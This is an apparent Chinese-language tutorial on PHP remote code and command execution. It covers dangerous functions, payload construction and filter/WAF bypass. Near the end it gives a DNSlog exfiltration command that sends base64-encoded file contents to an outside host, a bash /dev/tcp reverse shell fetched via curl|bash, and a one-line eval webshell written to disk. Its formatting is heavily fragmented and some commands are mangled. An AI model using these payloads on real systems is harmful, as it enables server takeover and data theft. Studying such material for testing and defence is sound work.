#  从0到1 学会究极RCE   
 影域实验室   2024-04-21 20:02  
  
**究极****RCE**  
  
—by Dreamscape Lynn逸  
- #### 漏洞成因  
  
简介  
  
RCE为两种漏洞的缩写,分别为Remote
Command/Code Execute, 远程命令/代码执行.  
  
远程命令执行  
  
操作系统命令注入或简称  
(命令执行  
)是一种注入漏洞  
,攻击者注入的payload将作为操作系统命令执行  
,仅当Web应用程序代码包含操作系统调用并且调用中使用了用户输入时  
,才可能进行  
OS命令注入攻击  
.它们不是特定语言  
,命令注入漏洞可能会出现在所有让你调用系统外壳命令的语言中  
,  
C  
,  
JAVA  
,  
PHP  
,perl  
,Ruby  
,Python等  
.  
  
  
操作系统使用Web服务器的特权执行注入的任意命令,因此,命令注入漏洞本身不会导致整个系统受损,但是,攻击者可能能够使用特权升级和其他漏洞来获得更多访问权限  
  
远程代码执行  
  
代码注入攻击与命令注入攻击不同,因为需求设计,后台有时候需要把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞,不管是使用代码执行的函数,或者使用了不安全的反序列化等  
  
通过代码注入或远程代码执行(RCE),攻击者可以通过注入攻击执行恶意代码,向网站写webshell，控制整个网站甚至服务器.其实际危害性取决于服务器端解释器的限制(列如PHP,python等).在一定情况下,攻击者可能能够从代码注入升级为命令注入  
  
通常,代码注入容易发生在应用程序执行却不经过验证代码的情况下,例如:  
  
$code   
=$_GET  
[  
'code'  
];  
eval  
(  
"$code;"  
);会将$_GET  
[  
'code'  
]关键字获取到的值赋值到$codeeval会将他$code的值当做代码执行可以利用其他关键字system转换为命令执行  
pyload构造  
:http  
://exp  
.com  
/?code  
=  
phpinfo  
();  
  
- #### 漏洞检测  
  
RCE漏洞是用于程序使用了危险函数的同时没有强大的验证过滤导致的,所以在黑盒测试的过程中,常用的思路是对输入端进行测试.  
  
许多开发人员认为文本字段是数据验证的唯一区域。这是一个错误的假设,任何外部输入都必须经过数据验证:文本字段,列表框,单选按钮,复选框,cookie,HTTP头数据,HTTP
post数据,隐藏字段,参数名称和参数值....当然这也不是详尽的清单,还必须研究,进程或实体的通信,任何与上游或下游流程通信并接受其输入的代码都必须被审查  
- #### PHP 代码执行  
  
可变函数:一个变量名后面如果有圆括号,php将寻找与变量值同名的函数并尝试执行.  
<table><colgroup><col width="165"/><col width="214"/><col width="369"/><col width="123"/></colgroup><tbody><tr valign="top"><td bgcolor="#f5f5f5" style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">代码执行</span></p></td><td bgcolor="#f5f5f5" style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">作用</span></p></td><td bgcolor="#f5f5f5" style="border-color: rgb(0, 0, 0);" width="153.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">例子</span></p></td><td bgcolor="#f5f5f5" style="border-color: rgb(0, 0, 0);" width="150.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">版本支持</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">${php代码}</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">会将{}内容里的函数解析</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">${phpinfo()}</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334"><br/></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);" height="61"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">eval()</span></p></td><td style="border-color: rgb(0, 0, 0);" height="61"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">把字符串作为PHP代码执行</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334" height="61"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">eval(phpinfo());</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334" height="61"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">eval是语言构造器,不能当可变函数</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);" height="62"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">assert()</span></p></td><td style="border-color: rgb(0, 0, 0);" height="62"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">检测指定内容结果为FALSE如果为字符串可代码执行</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334" height="62"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">assert(&#39;system(&#34;whoami&#34;)&#39;);</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334" height="62"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">可变函数调用			7.2版本后和eval一致</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">preg_replace() /e</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">执行一个正则表达式的搜索和替换			
			</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">preg_replace(&#34;/test/e&#34;,&#39;system(&#34;whoami&#34;)&#39;,&#39;test&#39;);</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">/e 代码执行版本&lt;=5.6版本</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">call_user_func()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">第一个参数作为回调函数调用,第二个未回调参数</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">call_user_func(&#39;system&#39;,&#39;whoami&#39;);</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334"><br/></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">call_user_func_array()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">第一个参数作为回调函数调用,数组参数作为回调的参数</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">call_user_func_array(&#39;system&#39;,array(&#39;whoami&#39;));</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334"><br/></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">create_function()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">匿名函数如果参数未过滤可提供提交特殊字符串导致代码执行</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">create_function(&#39;$test&#39;,&#39; ;}phpinfo();/*&#39;);</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">php7.2被弃用,在php8.0被移除.</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">array_map()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">第一个参数是回调函数,第二个参数是数组.</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">array_map(&#39;system&#39;,array(&#39;whoami&#39;));</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334"><br/></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">array_filter()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">依次将array数组中的每个值传递
			数组键名保持不变</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">array_filter(array(&#39;whoami&#39;),&#39;system&#39;);</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334"><br/></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">array_reduce()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">用回调函数迭代的将数组化为单一的值其他跟上上述一致</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">array_reduce([1,2],&#39;assert&#39;,&#39;phpinfo()&#39;);</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334"><br/></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">usort</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">使用用户自定义的比较函数对数组中的值排序</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">$arr=[1,&#39;eval($_GET[1])&#39;];usort($arr,&#39;assert&#39;)</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334"><br/></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">uasort</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">使用用户自定义的比较函数对数组中的值排序</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">$arr=[1,&#39;eval($_GET[1])&#39;];uasort($arr,&#39;assert&#39;)</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334"><br/></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">mbereg_replace</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">功能跟preg_replace一样支持e模式</span></p></td><td style="border-color: rgb(0, 0, 0);" width="153.33333333333334"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">mbereg_replace(&#39;.*&#39;, &#39;\0&#39;, $_GET[1], &#39;mer&#39;);</span></p></td><td style="border-color: rgb(0, 0, 0);" width="150.33333333333334"><br/></td></tr></tbody></table>  
  
动态函数$a($b)  
  
用于  
PHP的特性原因  
,php的函数支持直接拼接的方式调用  
,这直接导致了  
PHP在安全上的控制加大了难度  
,不少知名程序中也用到了动态函数的写法eval不能当作变量函数调用  
"eval属于PHP语法构造的一部分,并不是一个函数,所以不能通过
变量函数的形式来调用"还有其他语法例如echo
print unset isset empty include
require  
...  
<?php  
if  
(  
isset  
($_GET  
[  
'a'  
])){

   $a  
=$_GET  
[  
'a'  
];

   $b  
=$_GET  
[  
'b'  
];

     
$a  
($b  
);}  
1.判断是否有数据传入如果a有值那么进入  
if  
2.将a传入的值赋值给$a  
|?a  
=assert  
|相当于$a   
=assert  
;  
3.进入  
if后就可以给b传参了b传参的值会赋值给$b   
|?b  
=  
phpinfo  
();  
|相当于$b   
=  
phpinfo  
()  
4  
.$a的值动态调用了$b的值
合起来   
=  
assert  
(  
phpinfo  
())  
pyload  
:xxx  
/?a  
=assert  
&b  
=  
phpinfo  
();这里的  
;是为了闭合函数
最终执行   
assert  
(  
phpinfo  
())  
  
- PHP 命令执行  
  
<table><colgroup><col width="123"/><col width="260"/><col width="491"/></colgroup><tbody><tr valign="top"><td bgcolor="#f5f5f5" style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">命令函数</span></p></td><td bgcolor="#f5f5f5" style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">作用</span></p></td><td bgcolor="#f5f5f5" style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">例子</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">system()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">执行外部程序,并且显示输出</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">system(&#39;whoami&#39;)</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">exec()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">执行一个外部程序</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">echo exec(&#39;whoami&#39;);</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">shell_exec()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">通过shell环境执行命令,并且将完整的输出以字符串的形式返回</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">echo shell_exec(&#39;whoami&#39;);</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">passthru()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">执行外部程序并且显示数据原始输出</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">passthru(&#39;whoami&#39;);</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">pcntl_exec()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">在当前进程空间执行指定程序
			不能在非unix平台</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">pcntl_exec(&#34;/bin/cat&#34;,array(&#34;/etc/passwd));</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">popen()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">打开进程文件指针</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">$a=popen(&#34;bin/cat,/etc/passwd&#34;,&#34;r&#34;);$b=fread($a,2096);echo
			$b;pclose($a);</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">proc_open()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">执行一个命令,并打开一个io文件指针.类似popen(),但更复杂.</span></p></td><td style="border-color: rgb(0, 0, 0);"><br/></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">ob_start()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">打开内部缓冲
			输出内部缓存ob_end_flush()</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">&lt;?php ob_start(&#34;system&#34;); echo &#34;whoami&#34;;
			ob_end_flush();?&gt;</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">反引号``</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">echo `whoami`</span></p></td><td style="border-color: rgb(0, 0, 0);"><br/></td></tr></tbody></table>  
命令执行常用命令  
  
<table><colgroup><col width="97"/><col width="98"/><col width="110"/></colgroup><tbody><tr valign="top"><td bgcolor="#f5f5f5" style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">命令目的</span></p></td><td bgcolor="#f5f5f5" style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">linux</span></p></td><td bgcolor="#f5f5f5" style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">windows</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">当前用户名</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">whoami</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">whoami</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">操作系统</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">uname -a</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">ver</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">网络配置</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">ifconfig</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">ipconfig /all</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">网络连接</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">netstat -an</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">netstat -an</span></p></td></tr><tr valign="top"><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">运行进程</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">ps -ef</span></p></td><td style="border-color: rgb(0, 0, 0);"><p><span style="font-size: 14px;font-family:微软雅黑, &#34;Microsoft YaHei&#34;;">tesklist</span></p></td></tr></tbody></table>  
  
命令分隔符号  
li  
nux ;可以用 |或 ||代替  
  
;  
前面的执行完执行后面的  
|  
是管道符  
,  
显示后面的执行结果  
||  
当前面的执行出差时执行后面的  
可以用  
**%  
0a和\n  
**  
换行执行命令  
  
  
windows 不能用;可以用&,&&,|,||代替  
  
&前面的语句为假则直接执行后面的  
&&前面的语句为假则直接出错  
,后面的也不执行  
|直接执行后面的语句  
||前面的出错执行后面的  
- 常用代码执行函数解析  
  
1.${}特殊组合(双引号二次解析)  
  
php版本  
5.5及其以上版本可以使用$a  
=  
'lynn'  
;$$a  
=  
phpinfo  
();echo  
"${$a}"  
;  
=>  
代码执行phpinfo  
()  
1.得在双引号内  
2  
.$  
{}在一起  
3.中间的东西会代码执行  
4  
.php版本  
5.5版本及版本以上传参会被写入文件  
,只要在双引号内就可以  
解析流程  
:$  
{$a  
}  
>>$$a$a  
=lynn因为$$的原因会将$a的值当作变量来使用相当于形参一个叫做$lyyn的变量  
,  
因为$$的值是phpinfo  
()这里就相当于$lynn  
=  
phpinfo  
();  
输出$lynn的phpinfo  
();  
  
  
2.eval() 非函数
语法结构 为不可变函数  
  
eval  
($_REQUEST  
[  
'a'  
]);eval是代码执行用的最多的  
,他可以多行执行eval把字符串当代码执行  
,[eval他不是函数  
,他不受disable_function影响  
]php  
.ini配置disable_function可以禁用函数  
|disable_function  
=函数  
,函数  
,函数  
PHP插件禁用  
  
  
3.assert() 7.2版本后为语法结构  
  
assert  
($_REQUEST  
[  
'a'  
])  
:assert他只能执行单行  
,多行执行会报错assert可以通过写文件的方式来变成多行执行写文件然后执行  
,  
列如  
:  
file_put_contents  
(  
'1.php'  
,  
'<?php
eval($_REQUEST[1]);phpinfo();echo 1;?>'  
);  
  
  
4.preg_replace() 正则表达式
替换函数 ≤5.6  
  
正则表达式函数  
,  
/e他可以产生代码执行$a  
=  
'a'  
;echo  
preg_replace  
(  
'/a/e'  
,$_GET  
[  
8  
],$a  
);  
1.正则表达式  
2.待替换的值  
3.替换后的值这里如果传入的值是代码因为  
/e会直接执行结果不过要匹配的值跟替换的值要一致或匹配到  
  
  
5.create_function()  
  
$a   
=  
create_function  
(  
'$id'  
,  
'echo
$id;'  
)自定义函数$aecho  
$a  
(  
8  
);执行echo
$id  
;因为$id传参是  
8所以他会输出  
8$id在这里是形参  
而$a  
(  
8  
)传入实参$id数据
相当于$id  
=  
8并且输出  
8这里要能够控制参数就可以达到代码执行$a  
=  
create_function  
(  
''  
,$_REQUEST  
[  
8  
]);直接调用  
8  
=  
}  
phpinfp  
();  
//相当于此时匿名函数为  
function  
abc  
(  
$a  
){}  
phpinfo  
();  
//}类似SQL注入的闭合定义函数  
函数名abc  
($a  
)形参  
{内容  
}  
  
  
5.array_map  
  
array_map  
()
 第一个参数是回调函数  
,第二个参数是必须是数组数据  
.  
array_map  
(  
'assert'  
,  
'phpinfo()'  
);  
|要执行的函数  
,函数的传参  
  
- #### 代码执行绕过  
  
单引双引号做限制
绕过限制:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicxVefLIofqtVPDQWtKBicAsWOIAPMHhlcs8yVI7KW1vlH1Mj5TYWPfqg/640?wx_fmt=png&from=appmsg "")  
  
部分绕过方式
案例  
  
  
1.逃逸  
  
1.  
?code  
=$a  
=sys  
;$b  
=tem  
;$c  
=$a  
.$b  
;echo  
%  
20  
$c  
(whoami  
);拆分数据多行执行因为eval函数可以将数据多行执行  
2.  
?a  
=system  
&b  
=dir  
&code  
=$_GET  
[a  
]($_GET  
[b  
]);构造传参逃逸作用域因为eval函数可以将数据多行执行  
  
  
2.get_defined_functions  
  
PHP系统函数会返回一个多维数组  
,  
该数组包含了一个所有已定义函数  
(包含内部函数和用户定义函数  
)列表内部函数可以通过  
[  
"internal"  
][数字  
]多维数组表  
457值为system  
get_defined_functions  
()[  
"internal"  
][  
457  
](whoami  
)  
=  
system  
(whoami  
)  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicBHIFXF5DribFiafAFSXqqDEZUjd6KsNXeJpsIJpQq0JKB3HxLyCC8XAQ/640?wx_fmt=png&from=appmsg "")  
  
  
3.字符数组  
  
PHP中的每个字符串都可视为一个字符数组  
,并且可以通过语法$string  
[  
0  
],或者$string  
[  
1  
],来引用单个字符  
,这同时也是另一种绕过安全规则的方法列如仅仅使用字符串$a  
=  
"tsym"  
,就可以组成system  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmictCxqLlFblfSPMPRXDhQm9d6ezTwLUxrr6xORqics90LicwClVd34UQcw/640?wx_fmt=png&from=appmsg "")  
  
  
4.其他RCE等  
  
利用一些系统函数例如  
(__FILE__  
)会得到当前路径的信息如果我们访问的网页中有  
SYSTEM目录我们可以利用字符数组的方式取出来使用不过一般用在可以随意输入数据的地方通过文件包含include通过变量覆盖文件写入file_put_contents文件上传move_uploaded_file 等等  
  
  
5.bypass waf 部分  
  
加密
替换 编码 转换 传输方式
部分函数$_GET$_POST$_COOKIE$_REQUEST$_SERVER  
session_id  
()$_FILE$  
GLOBALS  
getallheaders  
()  
getdefinedvars  
()  
getdefinedfunctions  
()substr_replacesubstrstrtrstr_rot13base64_encodechrbin2hexstrrevurlencodejson_encodepackgzcompress  
/gzdeflate  
/gzencode$_GET  
[  
1  
]  
=$_GET  
{  
1  
}  
- 常用命令执行函数解析  
  
1.system  
  
system  
(  
'whoami'  
)php会操纵计算机执行whoami的命令  
,且输出返回结果  
目标  
:机器如果是linux执行的是bash命令  
|如果是windows执行的是cmd命令  
.echp  
"<?php
@eval($_REQUEST[8]);?>"  
>  
1  
.php  
tisp  
:echo  
"输入内容"  
>  
1  
.php是指把内容写入  
1  
.php尖括号对于echo来说是关键词  
,所以用双引号括起来  
得到的结果  
:成功写入文件  
,但是写入的文件有  
""包围了起来那么是不是就代表是字符串不能用了这里是  
<?php  
?>内的被  
""包围才会有影响所以说外面的双引号并不会影响到正常执行  
  
  
2.ec  
ho exec  
  
只会执行  
,如果有输出
显示结果的最后一行内容  
  
  
3.echo shell_exec  
  
只会执行  
,如果有输出
显示获得的所有数据  
  
  
4.``[反引号]  
  
shell_exec 特殊写法
禁用shell_exec就不可使用shell_exec  
  
  
5.passthru  
  
执行命令返回结果且输出跟system没有什么区别  
  
  
6.popen(要执行的命令,参数)
//r是只读 w是写入  
  
$a   
=  
popen  
(  
'whoami'  
,  
'r'  
);echo  
fread  
($a  
,  
1024  
);这个指的返回值比较特殊  
,返回的是一个文件指针  
,需要用fread去读取返回值长度
第二个指定输出多少个字符  
.  
  
命令执行无回显利用技巧  
  
  
1.延时  
  
可以使用注入的命令来触发时间延迟  
,从而根据应用程序相应来确认命令是否执行  
windows  
:echo  
1  
&ping  
-n  
10127.0.0.1  
&echo  
2会ping检测  
10次产生延时  
  
  
2.重定向输出  
  
我们可以将注入命令的输出重定向到web根目录下的文件当中  
,然后使用浏览器进行检索  
.如果他会在localhost提供静态资源绝对路径cmd   
>file 输出重定向到file文件cmd  
>file 输出追加到file中  
,无则创建windows
whoami   
>  
F  
:/  
PHPSTUDY  
/  
WWW  
/phpstudent  
/lynn  
.txt可以将我们的命令执行后的结果输出到指定目录文件当中  
  
  
3.DNSlog外带linux  
  
利用域名解析请求  
,dnslog  
.cn例如8qcijo  
.dnslog  
.cn那么因为dnslog使用了泛解析会将所有只要有8qcijo  
.dnslog  
.cn的xxx  
.8qcijo  
.dnslog  
.cncurl  
`cat<flag.php|base64`  
.awa4xw  
.ceye  
.io  
  
  
4  
.反弹shell  
  
1.首先在服务器用nc监听端口nc  
-lvp  
44442.  
如何在服务器上开启web访问  
(  
8000端口  
),  
写入一个文件  
(  
1  
.txt  
)内容如bash  
-i  
&/dev  
/tcp  
/x  
.x  
.x  
.x  
/  
44440  
>&  
13.执行payload  
?cmd  
=curl
x  
.x  
.x  
.x  
:  
8000  
/  
1  
.txt  
|bashpython一行代码实现简易http服务器python  
-m
SimpleHTTPServer  
  
  
命令执行定位文件  
  
  
dir /s/b "文件内容"文件名称  
  
